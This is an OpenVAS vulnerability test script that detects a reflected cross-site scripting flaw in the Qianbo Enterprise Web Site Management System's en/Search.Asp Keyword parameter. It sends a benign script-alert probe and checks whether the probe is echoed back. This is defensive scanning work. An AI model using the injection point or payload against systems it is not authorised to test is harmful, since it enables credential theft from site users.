###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_qianbo_enterprise_web_site_management_system_xss_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Qianbo Enterprise Web Site Management System Cross Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801925");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-04-22 16:38:12 +0200 (Fri, 22 Apr 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Qianbo Enterprise Web Site Management System Cross Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://sec.jetlib.com/tag/qianbo");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/100425/qianbo-xss.txt");
  script_xref(name:"URL", value:"http://www.rxtx.nl/qianbo-enterprise-web-site-management-system-cross-site-scripting-2/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"impact", value:"Successful exploitation could result in a compromise of the
application, theft of cookie-based authentication credentials.");
  script_tag(name:"affected", value:"Qianbo Enterprise Web Site Management System");
  script_tag(name:"insight", value:"The flaw is due to failure in the 'en/Search.Asp?' script to
properly sanitize user-supplied input in 'Range=Product&Keyword' variable.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Qianbo Enterprise Web Site Management System
and is prone to cross site scripting vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_asp(port:port)) exit(0);

foreach dir( make_list_unique( "/qianbo", "/enqianbo", "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  req = http_get(item:string(dir,"/en/index.asp"), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  if('QianboEmail' >< res && 'QianboSubscribe' >< res)
  {
    url = string(dir, '/en/Search.Asp?Range=Product&Keyword=<script>alert("XSS-TEST")</script>');
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "HTTP/1\.. 200" && '><script>alert("XSS-TEST")</script>' >< res) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );